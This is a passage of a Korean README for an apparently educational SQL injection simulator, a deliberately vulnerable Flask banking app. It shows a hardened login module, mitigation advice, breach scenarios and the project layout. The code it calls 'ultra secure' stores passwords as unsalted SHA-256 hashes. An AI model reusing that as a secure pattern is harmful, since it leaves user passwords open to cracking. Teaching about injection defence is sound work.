        current_time = datetime.now()
        window_start = current_time - timedelta(minutes=1)
        
        # 1분 윈도우 내 요청 수 확인
        pipe = self.redis_client.pipeline()
        pipe.zremrangebyscore(key, 0, window_start.timestamp())
        pipe.zadd(key, {str(current_time.timestamp()): current_time.timestamp()})
        pipe.zcard(key)
        pipe.expire(key, 60)
        
        results = pipe.execute()
        request_count = results[2]
        
        if request_count > self.max_attempts:
            self.lock_account(user_id)
            return False
        
        return True
    
    def lock_account(self, user_id):
        """계정 임시 잠금"""
        lock_key = f"account_lock:{user_id}"
        self.redis_client.setex(lock_key, self.lockout_duration, "locked")
        
        # 보안 이벤트 로깅
        logging.warning(f"Account locked due to suspicious activity: {user_id}")
    
    def is_account_locked(self, user_id):
        """계정 잠금 상태 확인"""
        lock_key = f"account_lock:{user_id}"
        return self.redis_client.exists(lock_key)
    
    def log_security_event(self, event_type, user_id, details):
        """보안 이벤트 로깅 및 알림"""
        
        event = {
            'timestamp': datetime.now().isoformat(),
            'event_type': event_type,
            'user_id': user_id,
            'details': details,
            'severity': self._calculate_severity(event_type)
        }
        
        # 로그 저장
        logging.warning(f"Security event: {event}")
        
        # 심각한 이벤트의 경우 즉시 알림
        if event['severity'] == 'HIGH':
            self._send_security_alert(event)
    
    def _calculate_severity(self, event_type):
        """이벤트 심각도 계산"""
        high_severity_events = [
            'SQL_INJECTION_ATTEMPT',
            'MULTIPLE_FAILED_LOGINS',
            'PRIVILEGE_ESCALATION_ATTEMPT'
        ]
        
        return 'HIGH' if event_type in high_severity_events else 'MEDIUM'
    
    def _send_security_alert(self, event):
        """보안 알림 발송"""
        # 이메일, SMS, Slack 등으로 알림 발송
        pass

# 통합 보안 로그인 함수
def ultra_secure_login(username, password, request_ip, user_agent):
    """모든 보안 조치가 적용된 로그인 함수"""
    
    monitor = SecurityMonitor()
    
    try:
        # 1. 계정 잠금 상태 확인
        if monitor.is_account_locked(username):
            return {'success': False, 'message': '계정이 일시적으로 잠겨있습니다.'}
        
        # 2. 요청 빈도 제한 확인
        if not monitor.check_rate_limit(username, 'login'):
            return {'success': False, 'message': '너무 많은 로그인 시도가 있었습니다.'}
        
        # 3. 입력 검증 및 악성 코드 탐지
        if not InputValidator.validate_username(username):
            monitor.log_security_event('INVALID_INPUT', username, {'input': username})
            return {'success': False, 'message': '올바른 사용자명을 입력해주세요.'}
        
        if SecureErrorHandler.detect_injection_attempt(username, username):
            monitor.log_security_event('SQL_INJECTION_ATTEMPT', username, {
                'input': username,
                'ip': request_ip,
                'user_agent': user_agent
            })
            return {'success': False, 'message': '잘못된 요청입니다.'}
        
        # 4. 안전한 인증 수행
        db_manager = DatabaseManager()
        user = db_manager.safe_read_query(
            "SELECT user_id, username, email, role FROM users WHERE username = ? AND password = ?",
            (username, hashlib.sha256(password.encode()).hexdigest())
        )
        
        if user:
            # 성공 로깅
            monitor.log_security_event('SUCCESSFUL_LOGIN', username, {
                'ip': request_ip,
                'user_agent': user_agent
            })
            return {'success': True, 'user': user[0]}
        else:
            # 실패 로깅
            monitor.log_security_event('FAILED_LOGIN', username, {
                'ip': request_ip,
                'user_agent': user_agent
            })
            return {'success': False, 'message': '사용자명 또는 비밀번호가 올바르지 않습니다.'}
    
    except Exception as e:
        # 예외 상황 로깅
        monitor.log_security_event('LOGIN_ERROR', username, {
            'error': str(e),
            'ip': request_ip
        })
        return SecureErrorHandler.handle_database_error(e, username, username)
```

#### 추가 보안 조치

1. **입력 검증**
```python
import re
import html

def validate_username(username):
    # 영문, 숫자, 언더스코어만 허용
    if not re.match("^[a-zA-Z0-9_]+$", username):
        return False
    if len(username) > 50:
        return False
    return True
```

2. **이스케이프 처리**
```python
import html

def escape_input(user_input):
    return html.escape(user_input)
```

3. **최소 권한 원칙**
- 데이터베이스 사용자에게 필요한 최소한의 권한만 부여
- 읽기 전용 계정과 쓰기 계정 분리

4. **오류 메시지 제한**
- 데이터베이스 구조 정보 노출 방지
- 일반적인 오류 메시지만 표시

5. **웹 애플리케이션 방화벽 (WAF) 사용**
- SQL 인젝션 패턴 자동 탐지 및 차단
- 실시간 위협 모니터링

6. **정기적인 보안 감사**
- 코드 리뷰 및 보안 테스트
- 취약점 스캐닝 도구 활용
### 🔍 실제 피해 시나리오

SQL 인젝션 공격이 성공하면:

1. **데이터 유출**
   - 모든 고객의 개인정보 접근
   - 계좌 정보 및 거래 내역 노출
   - 시스템 로그 및 관리자 정보 획득

2. **권한 상승**
   - 일반 사용자가 관리자 권한 획득
   - 시스템 전체 제어 가능

3. **데이터 조작**
   - 계좌 잔액 변경
   - 거래 내역 조작
   - 사용자 정보 수정/삭제

### 📊 관리자 시스템 접근

SQL 인젝션으로 관리자 권한 획득 시 접근 가능한 정보:

- **고객 관리**: 전체 고객 정보 및 계좌 상세 내역
- **거래 모니터링**: 모든 거래 내역 실시간 조회
- **시스템 로그**: 접속 기록 및 보안 감사 로그
- **통계 및 보고서**: 비즈니스 인텔리전스 데이터

## 📁 프로젝트 구조

```
sql_injection_simulator/
├── app.py                 # 메인 애플리케이션 (취약점 포함)
├── requirements.txt       # 의존성 목록
├── run.bat               # Windows 실행 스크립트
├── README.md             # 프로젝트 설명
├── users.db              # SQLite 데이터베이스 (자동 생성)
└── templates/            # HTML 템플릿
    ├── base.html         # 기본 템플릿
    ├── login.html        # 로그인 페이지
    ├── dashboard.html    # 사용자 대시보드
    ├── admin_dashboard.html    # 관리자 대시보드
    ├── customer_detail.html    # 고객 상세 정보
    └── admin_reports.html      # 관리자 보고서
```

## 🔧 기술 스택

- **Backend**: Python Flask
- **Database**: SQLite
- **Frontend**: HTML, CSS, Bootstrap 5, Font Awesome
- **Security**: 의도적 취약점 (교육용)

## 📱 주요 기능

### 로그인 시스템
- 사용자 인증 및 세션 관리
- 계정 유형별 권한 관리
- **SQL 인젝션 취약점 포함**

### 사용자 대시보드
- 개인정보 조회
- 계좌 잔액 확인
- 거래 내역 조회

### 관리자 시스템
- 전체 고객 관리
- 거래 모니터링
- 시스템 로그 조회
- 비즈니스 보고서

## 📚 학습 목표

1. SQL 인젝션 취약점의 원리 이해
2. 취약한 코드와 안전한 코드의 차이점 학습
3. 실제 공격 시나리오 체험


